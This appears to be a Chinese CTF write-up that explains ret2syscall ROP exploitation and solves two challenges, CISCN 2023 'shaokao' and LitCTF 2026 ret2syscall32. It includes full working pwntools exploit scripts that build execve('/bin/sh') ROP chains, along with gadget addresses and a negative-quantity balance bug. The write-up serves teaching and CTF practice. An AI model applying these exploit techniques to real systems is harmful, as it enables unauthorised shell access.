---
title: Pwn-ret2syscall
description: pwn-第6部分ret2syscall学习
date: 2026-05-21 18:37:46
updated: 2026-05-21 18:37:46
image: https://images.cnblogs.com/cnblogs_com/blogs/860797/galleries/2492655/o_260521110246_e2bad22013ddfda6b490f4f33d0bbaecf23ca95b.png
categories: [pwn]
tags: [pwn, syscall, 栈溢出]
---

# Pwn-syscall

## 原理

### **ret2syscall**（Return-to-System-Call）

`ret2syscall` 是一种在**静态链接**（程序没有导入 `libc` 库）且开启了 **NX 保护**（栈上不可执行代码）的二进制程序中常用的 ROP 利用技术。

既然程序本身没有现成的 `system("/bin/sh")` 函数让我们调用，我们就利用程序内部已有的**零碎代码片段（Gadgets）**，像拼乐高一样，把 CPU 寄存器布置成执行 `execve("/bin/sh", NULL, NULL)` 系统调用所需要的状态，最后触发操作系统的内核中断来实现 Getshell。



### 32位 vs 64位 系统调用约定

不管是通过栈还是寄存器传递参数，`ret2syscall` 的核心都是精准控制寄存器。在不同架构下，调用的约定有明确的区别：

| **架构**       | **系统调用号存放** | **Arg 1 (字符串指针)** | **Arg 2** | **Arg 3** | **触发指令** | **execve 系统调用号** |
| -------------- | ------------------ | ---------------------- | --------- | --------- | ------------ | --------------------- |
| **32位 (x86)** | `eax`              | `ebx`                  | `ecx`     | `edx`     | `int 0x80`   | `11` (`0xb`)          |
| **64位 (x64)** | `rax`              | `rdi`                  | `rsi`     | `rdx`     | `syscall`    | `59` (`0x3b`)         |

以 64 位为例，我们需要构建的终极状态是：`rax=59`，`rdi="/bin/sh"的地址`，`rsi=0`，`rdx=0`，最后再执行一条 `syscall` 指令。



### 完整的攻击构建链

在实战中，构建一次完美的 `ret2syscall` 通常需要经过以下步骤：



**1.寻找可用 Gadgets：使用 ROPgadget 等工具。**

> 通过命令 `ROPgadget --binary ./pwn --only "pop|ret"` 寻找需要的指令片段。在 64 位下重点寻找 `pop rax ; ret`、`pop rdi ; ret`、`pop rsi ; ret`、`pop rdx ; ret`。同时，利用工具找到 `syscall`（或 `int 0x80`）指令的确切内存地址。

**2.处理 /bin/sh 字符串：寻找或动态写入。**

> 先用 `ROPgadget --binary ./pwn --string "/bin/sh"` 检查程序里是否自带了该字符串。
>
> 如果没有，就需要再找一个类似 `mov qword ptr [rax], rdx ; ret` 的写入 Gadget，把 `/bin/sh` 的十六进制数据写入到一个固定的、可读可写的内存段（如 `.bss` 段）。

**3.组装 Payload:控制执行流。**

> 利用 Pwntools 拼装最终的输入流：
>
> `Padding（填充满缓冲区直到覆盖返回地址）` + `pop rdi 的地址` + `/bin/sh 的地址` + `pop rax 的地址` + `59` + `pop rsi 的地址` + `0` + `pop rdx 的地址` + `0` + `syscall 的地址`。

---

### 原理动画

::alert{icon="ph:files-duotone" color="var(--c-accent)" title="动画链接"}

https://gitee.com/ASUS_HACKED/cybersecurity/blob/%E6%AF%94%E8%B5%9B%E9%99%84%E4%BB%B6/HACKED%E7%AC%94%E8%AE%B0pwn/%E5%8A%A8%E7%94%BB%E9%93%BE%E6%8E%A5/NSSCTF-PWN/%E6%A0%88/ret2syscall/ret2syscall_demo.html

::

## [CISCN 2023 初赛]烧烤摊儿

::alert{type="question" title="题目地址"}
 https://www.nssctf.cn/problem/4055
::

### 0x01 基本信息

| 项目     | 内容                                                     |
| -------- | -------------------------------------------------------- |
| 文件     | `shaokao`                                                |
| 架构     | amd64-64-little                                          |
| 保护     | NX enabled, No PIE, Stack Canary (gaiming 函数无 canary) |
| 类型     | 静态链接, not stripped                                   |
| 初始金币 | 233                                                      |
| VIP 价格 | 100000                                                   |

![image-20260521174344263](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260521183455030-1264643335.png)

---

### 0x02 漏洞分析

#### 菜单分析

我们先看看程序是什么样子的
![image-20260521174455811](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260521183454646-674798867.png)



![image-20260521174556407](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260521183454296-1535043594.png)

通过IDA的反汇编就可以知道这些函数对应的就是菜单信息，其中第五个菜单需要触发特定条件才能解锁。

同时通过对gaming()函数的解析

![image-20260521175017623](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260521183453913-230730022.png)

#### 栈溢出

这里出现了一个栈溢出。

```c
char v5[32]; // [rsp+0h] [rbp-20h] BYREF         
_isoc99_scanf((unsigned int)&unk_4B71EB, (unsigned int)v5, v0, v1, v2, v3);//scanf("%s",&v5)
j_strcpy_ifunc(&name, v5);//strcpy(name,v5)
```

```c
_isoc99_scanf((unsigned int)&unk_4B71EB, (unsigned int)v5, v0, v1, v2, v3);
```

::chat
{一个好奇的小盆友}

这条语句是什么意思？

{.HACKED}

转化过来的话是scanf("%s", v5),我们追踪看看unk_4B71EB

{.}

04B71EB和04B71EC分别是16进制的%和s

{一个好奇的小盆友}

那后面一堆 v0, v1, v2, v3 是什么？

{.HACKED}

是 IDA 反编译的假象。因为是可变参数函数（...），IDA会把调用时恰好留在寄存器里的值也当成参数列出来。在 x86-64 调用约定里：

{.}

```bash
rdi = 格式串  "%s"      ← 第1个参数
  rsi = v5                  ← 第2个参数，存目标地址
  rdx = v0  ← ┐
  rcx = v1  ← ├ 这些是调用前寄存器残留值
  r8  = v2  ← │ IDA 误当成额外参数
  r9  = v3  ← ┘


```

{.}

  但 scanf("%s") 只认一个格式说明符 %s，所以只会读一个字符串到 v5，后面那几个根本不会被
   scanf 用到。

{.}

虽然这个文件有canary保护,但是此函数并没有

::



::quote
#icon
ヾ(•ω•`)o

#default

那我们就开始分析条件吧

::

---

#### 刷钱漏洞

烤串和啤酒都支持输入**数量（整数）**，价格公式为 `金额 -= 数量 × 单价`。若数量为负数，金额**增加**：输入数量 -20000 → 金额 += 20000 × 5 = +100000

![image-20260521181305472](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260521183453529-272236042.png)



---

### 0x03 攻击思路

1. 利用负数数量刷钱 → 买 VIP → 进入改名
2. 在改名处构造 ROP chain，做 `execve("/bin/sh", NULL, NULL)`
3. 全局 `name` 缓冲区地址 `0x4e60f0` 存放 `/bin/sh`

---

### 0x04 ROP Gadgets

使用ROPgadget找出地址

```bash
ROPgadget --binary shaokao --only "pop|ret" | grep -E "pop (rax|rdi|rdx|rsi)"
```

![image-20260521182451249](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260521183453143-248010610.png)

```bash
ROPgadget --binary shaokao --only "syscall" 
```

![image-20260521182739372](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260521183452320-522574825.png)

那我们就差bin/sh需要构造了，用ROPgadget和IDA的:key{code="F12" shift}是找不到的

| 用途      | Gadget                  | 地址       |
| --------- | ----------------------- | ---------- |
| 设调用号  | `pop rax; ret`          | `0x458827` |
| arg1      | `pop rdi; ret`          | `0x40264f` |
| arg2      | `pop rsi; ret`          | `0x40a67e` |
| arg3      | `pop rdx; pop rbx; ret` | `0x4a404b` |
| 触发      | `syscall`               | `0x402404` |
| "/bin/sh" | name 全局变量           | `0x4e60f0` |

ROP 链结构：

```lua
pop rax → 59 (SYS_execve)
pop rdi → 0x4e60f0 ("/bin/sh")
pop rsi → 0 (argv = NULL)
pop rdx; pop rbx → 0, 0 (envp = NULL, rbx = dummy)
syscall
```

---

### 0x05 最终 Exploit

#### 版本一

```python
from pwn import *

context.arch = 'amd64'
e = ELF('./shaokao')

# gadgets
pop_rax     = 0x458827
pop_rdi     = 0x40264f
pop_rsi     = 0x40a67e
pop_rdx_rbx = 0x4a404b
syscall     = 0x402404
name_addr   = 0x4e60f0

def exploit(p):
    # ========== Step 1: 刷钱 ==========
    # 收主菜单6行
    for _ in range(6):
        p.recvline()
    p.recvuntil(b'> ')

    p.sendline(b'2')        # 烤串

    # 子菜单4行
    for _ in range(4):
        p.recvline()

    p.sendline(b'1')        # 羊肉串
    p.sendline(b'-20000')   # 负数量 → 余额 +100000

    # ========== Step 2: 买VIP ==========
    for _ in range(6):
        p.recvline()
    p.recvuntil(b'> ')

    p.sendline(b'4')        # 承包摊位
    p.recvline()            # 老板...
    p.recvline()            # 成交

    # ========== Step 3: 改名 + 栈溢出 ==========
    # 有VIP后菜单多一项 5.改名
    for _ in range(7):
        p.recvline()
    p.recvuntil(b'> ')

    p.sendline(b'5')        # 改名
    p.recvline()            # 请赐名：

    # ========== Step 4: ROP chain ==========
    payload  = b'/bin/sh\x00'           # → strcpy 拷到 name 全局
    payload += b'A' * 24                # 填满 buf[32]
    payload += b'B' * 8                 # 覆盖 saved rbp
    payload += p64(pop_rax)
    payload += p64(59)                   # SYS_execve
    payload += p64(pop_rdi)
    payload += p64(name_addr)
    payload += p64(pop_rsi)
    payload += p64(0)
    payload += p64(pop_rdx_rbx)
    payload += p64(0) + p64(0)
    payload += p64(syscall)

    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1:
        p = remote(sys.argv[1], int(sys.argv[2]))
    else:
        # Windows WSL 环境
        p = process(['wsl', './shaokao'])
    exploit(p)
```

#### 版本二

```python
from pwn import *

context(os='linux',arch = 'amd64',log_level = 'debug')


#r = process('./shaokao')
r = remote('node4.anna.nssctf.cn',22582)

r.sendlineafter(b'>',b'1')
r.sendline(b'2')
r.sendline(b'-10000')
r.sendline(b'4')
r.sendline(b'5') 


bin_sh = 0x04E60F0
offset = b'/bin/sh\x00'
offset = offset.ljust(40,b'\x00')
syscall = 0x0402404
pop_rax = 0x0458827
pop_rdi = 0x040264f
pop_rsi = 0x040a67e
pop_rdx_rbx = 0x04a404b

payload = offset+p64(pop_rax)+p64(59)+p64(pop_rdi)+p64(bin_sh)+p64(pop_rsi)+p64(0)+p64(pop_rdx_rbx)+p64(0)+p64(0)+p64(syscall)
r.sendline(payload)

r.interactive()
```

---

### 0x06 关键点总结

1. **负数交易刷钱**：`金额 -= 数量 × 单价`，填负数即可增加余额
2. **`scanf("%s")` 不认 `\x00` 为分隔符**：payload 中的 null 字节（地址）可以正常写入栈
3. **`/bin/sh\x00` 放 payload 开头**：`strcpy` 遇到 `\x00` 截断，name 全局缓冲区内刚好是 `"/bin/sh"`
4. **64位 syscall 传参**：`rax=调用号` → `rdi/rsi/rdx` = 三个参数 → `syscall` 触发
5. **针对静态链接无 libc 的题**：直接拼 syscall ROP 链，不依赖程序中是否有 `system` 函数

---



## [LitCTF 2026]  lit_ret2syscall32

::alert{type="info" title="题目地址"}
https://platform.cyclens.tech/#/challenge/95
::

### 0x01 基本信息

checksec查看信息

```bash
    Arch:       i386-32-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
    Debuginfo:  Yes
```

程序执行

![image-20260615091310427](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615104505200-2114503495.png)

---

IDA pro查看代码

#### main()

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  vuln();
  puts("Goodbye!");
  return 0;
}
```

#### vuln()

```c
void vuln()
{
  char buf[64]; // [esp+0h] [ebp-48h] BYREF

  puts("Welcome to the 32-bit Time Machine!");
  puts("No system(), no /bin/sh... but int 0x80 still works.");
  printf("Input: ");
  read(0, buf, 0x200u);//这里就有栈溢出了
}
```

出现了这些可疑的东西

![image-20260615090637200](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615104503969-1302820985.png)

shift+F12观察字符串信息也没发现什么有用的信息，但是题目说了有int 0x80，那说明这题是syscall

---

### 0x02 漏洞分析

```lua
main->vuln->read()栈溢出
```

#### 栈溢出

vuln非法读取超过数组的大小

溢出偏移 = `0x48 (buf + padding) + 4 (saved ebp)` = **0x4C = 76 字节**

![image-20260615091458118](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615104503237-1708629262.png)

---

### 0x03 攻击思路

这题是32位的syscall，那其实我们就是需要将几个特定的寄存器设定指定参数就行。

32位函数调用约定如下

| **架构**       | **系统调用号存放** | **Arg 1 (字符串指针)** | **Arg 2** | **Arg 3** | **触发指令** | **execve 系统调用号** |
| -------------- | ------------------ | ---------------------- | --------- | --------- | ------------ | --------------------- |
| **32位 (x86)** | `eax`              | `ebx`                  | `ecx`     | `edx`     | `int 0x80`   | `11` (`0xb`)          |

那就是需要寻找这些寄存器并设置这些参数
pop eax ->填充int 0x80
pop ebx -> /bin/sh
pop ecx -> 0
pop edx -> 0

其实程序提示了gadget链

![image-20260615092440632](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615104502406-1786067475.png)

move_edx_eax是传输参数用的，也就是将我们构造的`/bin/sh`塞入edx寄存器中

用ROPgadget找出我们要的传参寄存器

```bash
ROPgadget --binary ./ret2syscall32 --only "pop|ret|int|mov"
```

```asm
0x080491a6 : pop eax ; ret
0x08049022 : pop ebx ; ret
0x080491b0 : pop ecx ; pop ebx ; ret
0x080491b6 : pop edx ; ret
0x080491bb : mov dword ptr [edx], eax ; ret
0x080491c1 : int 0x80
```



这是我开发的一个小小的脚本，脚本源码已经开源到博客HACKED制作的小工具博客文章

![image-20260615102755173](https://img2024.cnblogs.com/blog/3726946/202606/3726946-20260615104501067-2076230701.png)

---



### 0x04 payload构造

#### 写入思路

利用`mov [edx], eax ; ret`将四个字节写入内存中

```asm
写入 "/bin" → data_buf + 0
写入 "/sh\0" → data_buf + 4
```

字符串的小端序表示：

- `"/bin"` = `0x6e69622f`
- `"/sh\0"` = `0x0068732f`

----

#### 完整ROP Chain

```asm
                    ┌─────────────────────────────┐
                    │  填充: 0x48 + 4 = 76 字节    │
                    ├─────────────────────────────┤
                    │                             │
  第一阶段: 写入      │  pop eax; ret               │
  "/bin" → .bss     │  0x6e69622f                 │
                    │  pop edx; ret               │
                    │  data_buf                   │
                    │  mov [edx], eax; ret        │
                    │                             │
  第二阶段: 写入      │  pop eax; ret               │
  "/sh\0" → .bss+4  │  0x0068732f                 │
                    │  pop edx; ret               │
                    │  data_buf + 4               │
                    │  mov [edx], eax; ret        │
                    │                             │
  第三阶段:          │  pop eax; ret               │
  execve 调用        | 0x0b                       |
                    │  pop ecx; pop ebx; ret      │
                    │  0x00000000                 │
                    │  data_buf (→ ebx="/bin/sh") │
                    │  pop edx; ret               │
                    │  0x00000000                 │
                    │  int 0x80                   │
                    └─────────────────────────────┘
```

### 0x05 EXP

```python
from pwn import *
context(os='linux', arch='i386')

r = process('./ret2syscall32')
# r = remote('challenge.cyclens.tech', 30577)

# ── Gadget 地址 ──
pop_eax     = 0x080491a6   # pop eax ; ret
pop_ecx_ebx = 0x080491b0   # pop ecx ; pop ebx ; ret
pop_edx     = 0x080491b6   # pop edx ; ret
mov_edx_eax = 0x080491bb   # mov [edx], eax ; ret
int_0x80    = 0x080491c1   # int 0x80

# ── .bss 可写地址 ──
data_buf    = 0x0804b3a0

# ── 溢出填充 ──
offset = 0x48 + 4          # buf[0x48] + saved_ebp
payload = b'A' * offset

# ── 写入 "/bin/sh\0" 到 data_buf ──
# 写 "/bin"
payload += p32(pop_eax) + p32(0x6e69622f)
payload += p32(pop_edx) + p32(data_buf)
payload += p32(mov_edx_eax)

# 写 "/sh\0"
payload += p32(pop_eax) + p32(0x0068732f)
payload += p32(pop_edx) + p32(data_buf + 4)
payload += p32(mov_edx_eax)

# ── execve("/bin/sh", 0, 0) ──
payload += p32(pop_eax) + p32(0xb)        # eax = 11 (execve)
payload += p32(pop_ecx_ebx) + p32(0) + p32(data_buf)  # ecx=0, ebx="/bin/sh"
payload += p32(pop_edx) + p32(0)          # edx = 0
payload += p32(int_0x80)                  # 触发系统调用

r.sendline(payload)
r.interactive()
```